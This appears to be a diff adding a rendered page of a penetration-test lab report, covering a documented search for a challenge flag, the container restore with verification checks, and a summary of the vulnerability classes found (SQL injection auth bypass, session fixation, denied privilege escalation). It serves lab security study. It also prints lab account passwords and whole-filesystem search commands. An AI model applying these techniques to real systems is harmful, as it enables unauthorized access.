+<td><code>find / -xdev \( -iname '*flag*' -o -iname '*duque*' \)</code>, excluding <code>/proc</code>, <code>/sys</code></td>
+<td>whole filesystem</td>
+<td><strong>4</strong> paths: <code>waitflags.ph</code>, <code>ss_flags.ph</code> (Perl bitmask headers), <code>debian-10.6.flag</code> (a MariaDB <strong>packaging</strong> marker, not a challenge file), and <code>[lab-home]/duque</code> itself. <strong>0</strong> rewards.</td>
+</tr>
+<tr>
+<td><code>grep -rIl 'FLAG{' /</code> excluding <code>/proc</code>, <code>/sys</code>, <code>/dev</code></td>
+<td>whole filesystem</td>
+<td><strong>0</strong> files.</td>
+</tr>
+<tr>
+<td><code>information_schema.tables</code> over all non-system schemas</td>
+<td>every database</td>
+<td>exactly one application table: <code>register.users</code>, 3 rows, all read (§3 F1). <strong>0</strong> other tables.</td>
+</tr>
+<tr>
+<td><code>find [lab-home]/duque -type f</code></td>
+<td>the only non-root home</td>
+<td>4 files, all stock dotfiles.</td>
+</tr>
+<tr>
+<td>hidden files in the docroot</td>
+<td><code>/var/www/html</code>, <code>/bills</code></td>
+<td><strong>0</strong> dotfiles.</td>
+</tr>
+<tr>
+<td>HTTP</td>
+<td>10 paths enumerated in §1.3</td>
+<td>no reward endpoint, no differing body.</td>
+</tr>
+<tr>
+<td><code>/root</code></td>
+<td>the one root-only directory</td>
+<td><code>ls -la /root/</code> → <code>.bashrc</code>, <code>.profile</code> only. <strong>No reward at root either.</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>The <code>grep</code> negative carries a green positive control</strong>, which is the only reason its
+zero is worth reading. The identical command pointed at a string I know is present:</p>
+<pre><code>$ grep -rIl 'duquelaje81029557' / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev
+/var/www/html/bills/panel.php
+</code></pre>
+<p>The instrument finds things. Its <code>0</code> for <code>FLAG{</code> is a measured absence, not a tool that
+looked nowhere.</p>
+<p><strong>A stated boundary.</strong> The name-based <code>find</code> and the <code>FLAG{</code> grep were run as root
+through the host's Docker socket — which is <strong>operator access, not a link in the attack
+chain</strong>, and I am not claiming it as a privilege. From the identities the engagement
+actually attained, the search reached everything except <code>/root</code> and <code>/etc/shadow</code>, both
+measured as <code>Permission denied</code> from <code>uid=1000</code>. So the honest statement is: no reward
+exists anywhere on the host, including in the two places the attack chain could not look.</p>
+<p>Per the corpus's rule, I am reporting the absence and the search that established it.
+I am not inventing a reward, and I am not making a claim about the <strong>class</strong> of lab from
+a claim about this <strong>instance</strong>. The <code>FLAG{}</code> column of <a href="../labs.html"><code>../INDEX.md</code></a> is
+the single source for the corpus-wide count, and I make no claim about my position in
+any sequence.</p>
+<hr />
+<h2 id="11-restore">11. Restore</h2>
+<p>Recreated from the image, not reverted, and verified with <strong>positive</strong> checks:</p>
+<pre><code>old container: 74c0aa27e3ecd7b7223c54cdc02aaa6c0db06a30f2b8cdfe7e0475d4b181d1ea
+docker rm -f duque_container &amp;&amp; docker run -d --name duque_container duque:latest
+new container: 459bdf80bd548fa323b246b167d0096076f5116755b2102ec786f60ecac4e82b
+status=Up    IP=[net-0-4]  (unchanged)
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Check</th>
+<th>Expected (shipped)</th>
+<th>Measured</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>GET /</code></td>
+<td><code>200</code>, 11 622 B</td>
+<td><code>200</code>, <strong>11 622 B</strong></td>
+</tr>
+<tr>
+<td><code>GET /bills/</code></td>
+<td><code>200</code>, 4 676 B, login form</td>
+<td><code>200</code>, <strong>4 676 B</strong>, marker present</td>
+</tr>
+<tr>
+<td><code>register.users</code> row count and contents</td>
+<td>3 rows as shipped</td>
+<td><code>1 Mario mario123</code>, <code>2 Jesus jesus2026</code>, <code>3 Admin admin123</code> — <strong>counter back to its shipped value</strong></td>
+</tr>
+<tr>
+<td><code>GET /bills/panel.php?id=xyc724</code>, no session</td>
+<td><code>302</code> → <code>/bills/index.php</code></td>
+<td><code>302</code>, <code>Location: http://[net-0-4]/bills/index.php</code></td>
+</tr>
+<tr>
+<td>non-system tables</td>
+<td><code>register.users</code> only</td>
+<td><code>register.users</code> only — my <code>m2</code>, <code>m3</code>, <code>duque_marker</code> are <strong>gone</strong></td>
+</tr>
+<tr>
+<td>my files in <code>/tmp</code></td>
+<td>none</td>
+<td>none (<code>duque243*</code>, <code>oracle243*</code>, <code>final243*</code> all removed)</td>
+</tr>
+<tr>
+<td>webroot file count</td>
+<td>8</td>
+<td><strong>8</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>On my own artefacts:</strong> I removed only files I created, by name. Two of them
+(<code>/tmp/duque243_marker.txt</code>, <code>/tmp/duque243_v3.txt</code>) were owned by <code>mysql</code> in a sticky
+<code>/tmp</code>, so <code>duque</code> could not unlink them — they were removed with the container's
+destruction, and the listing above confirms none remain. I did not touch anything in
+<code>/tmp</code> I did not create, and no prune of any kind was run: no <code>docker system prune</code>, no
+<code>docker image prune -a</code>, no <code>docker volume prune</code>. The <code>duque:latest</code> image is left in
+place deliberately — the restore depends on it, and the lab container is <strong>up and
+serving</strong>, which is what &quot;restored&quot; means here.</p>
+<hr />
+<h2 id="12-feed-forward">12. Feed-forward</h2>
+<p>Against <a href="../labs.html"><code>../INDEX.md</code></a>, the classes in this lab are <strong>already covered</strong>,
+and the correct outcome is to extend rather than to add:</p>
+<table>
+<thead>
+<tr>
+<th>Class here</th>
+<th>Existing coverage</th>
+<th>What this lab adds to the row</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SQLi → auth bypass</td>
+<td>209, 283, 293</td>
+<td>A <strong>UNION</strong> discriminator built from a <em>measured</em> column count (1/2/4/5 columns each → <code>500</code>/0 B, 3 → <code>200</code>/75 B), so the mismatch is visibly an error and not a silent negative.</td>
+</tr>
+<tr>
+<td>IDOR vs not-IDOR</td>
+<td>85</td>
+<td>The <strong>inverse</strong> case, and it is the useful one: three byte-distinguishable states where the middle one is a <strong>refusal</strong>, which is what refutes the label. 85 proved an IDOR is not merely &quot;unauthenticated&quot;; here the same three-state test proves an admin-gated hardcoded string is not an IDOR at all.</td>
+</tr>
+<tr>
+<td>Privilege escalation</td>
+<td>129, 141, 146, 189</td>
+<td>The <strong>negative</strong> half with an oracle that fired: a full DBA that stops at uid 103, measured from the daemon's own <code>/proc</code>, with 7 of 7 root-consumed write paths denied.</td>
+</tr>
+<tr>
+<td>Writable-file enumeration</td>
+<td>33, 112, 117</td>
+<td>Two tools agreeing on 5 paths from the same identity (<code>find -writable</code> = 4 files, all in <code>$HOME</code>; <code>test -w</code> = 5 targets, all <code>no</code>).</td>
+</tr>
+<tr>
+<td>Session handling</td>
+<td>172, 271, 293</td>
+<td>The <strong>fixation</strong> primitive, and the first case in this corpus where the replayed SID is proved by <em>byte count against a never-used control</em> (5 467 B vs <code>302</code>/0 B) rather than by a status code.</td>
+</tr>
+<tr>
+<td>Lab self-mislabelling</td>
+<td>102, 108, 112, 220</td>
+<td>A <strong>new variant</strong>: the <em>description</em> is clean and the <strong>artefact's own comment</strong> is wrong. Extends the row with &quot;check the source comment, not only the catalogue&quot;.</td>
+</tr>
+<tr>
+<td>Dead control in the artefact</td>
+<td>146</td>
+<td><strong>Second instance</strong>, and a new shape: a defensive error handler made unreachable by the runtime's own defaults (<code>mysqli</code> strict mode), so the fix for a 2015-era idiom <em>silently disabled</em> the disclosure the author wanted. The only honest way to report it is as a lab defect, not a client finding.</td>
+</tr>
+</tbody>
+</table>
+<p>One <strong>new</strong> rule is proposed, because no existing row covers it and it is the most
+transferable thing here:</p>
+<blockquote>
+<p><strong>Existence is not authorship.</strong> An oracle that asks &quot;does this path exist now?&quot;
+after performing a write will report a pre-existing file as your own artefact — and
+it reports it with the <em>victim's</em> ownership, which is the most attractive possible
+false positive. Every write primitive needs a <strong>pre-existence baseline</strong> and a
+<strong>uniquely-marked payload</strong>; verify by marker and mtime, never by <code>-f</code>. When the
+target path already ships (a cron helper, a config file the service reads), the
+write is <em>refused</em>, and the refusal is the result.</p>
+<p>Corollary: a service that <strong>refuses to overwrite</strong> is a control, and a report that
+says otherwise is a report about <code>stat</code>, not about the target.</p>
+</blockquote>
+<p>And one extension to an existing rule, which §7.4 falsifies a naive reading of:</p>
+<blockquote>
+<p>Rule 3 says <em>measure what the framework consumes, not what the file contains</em>. This
+lab is the case where the framework <strong>never calls</strong> the thing the file contains: an
+<code>if (!$result) { die(mysqli_error($conn)); }</code> that PHP 8.1 makes unreachable, because
+<code>mysqli</code> throws at the call site. The absence of a fired control is a property of the
+runtime, and reading it off the file yields a finding with a plausible CWE and no
+behaviour behind it.</p>
+</blockquote>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
